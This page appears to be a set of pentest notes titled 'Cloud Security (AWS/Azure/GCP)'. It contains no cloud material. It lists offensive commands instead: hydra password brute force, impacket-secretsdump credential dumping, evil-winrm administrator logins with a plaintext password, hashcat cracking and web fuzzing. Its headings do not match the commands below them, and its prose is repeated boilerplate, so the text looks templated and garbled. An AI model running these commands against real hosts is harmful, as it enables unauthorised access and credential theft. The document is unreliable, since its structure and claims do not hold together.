---
TitleSEO: "Cloud Security (AWS/Azure/GCP) | ZureFX"
TitlePost: "Cloud Security (AWS/Azure/GCP)"
Author: "ZureFX"
Description: "Personal notes on Cloud Security (AWS/Azure/GCP). Quick reference for pentesting and CTF challenges."
Keywords: "blue team, enumeration, persistence, windows"
URL: "https://zurefx.github.io/notes/note-cloud-security-(aws-azure-gcp)-359.html"
URL_IMAGES: ""
Date: "2024-04-17"
Tags: "Blue Team, Enumeration, Persistence, Windows"
Section: "notes"
Lang: "en"
main_img: "note-cloud-security-(aws-azure-gcp)-359"
Permalink: "/notes/note-cloud-security-(aws-azure-gcp)-359.html"
BtnLabel: "Read Notes"
Pick: 0
---
## lookupsid

### SMTP

```bash
crackmapexec smb 10.89.194.4 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.60.82.116 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.22.97.179
feroxbuster -h
```

- `smbexec`
- `evil-winrm`
- `SeImpersonatePrivilege`
- `DCSync`

## evil-winrm

### SUID Binary

- `evil-winrm`
- `impacket`
- `netcat`

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.79.81.71 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.14.22.118 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.5.138
```

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.34.51.116/FUZZ
feroxbuster -h
```

## Remote Code Execution

### IDOR

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.11.97.249 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.101.77.21 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.64.152.196 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

## LXD Privilege Escalation

### Golden Ticket

> **Note:** Subdomain Takeover was identified as the primary attack vector in this scenario.

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials.
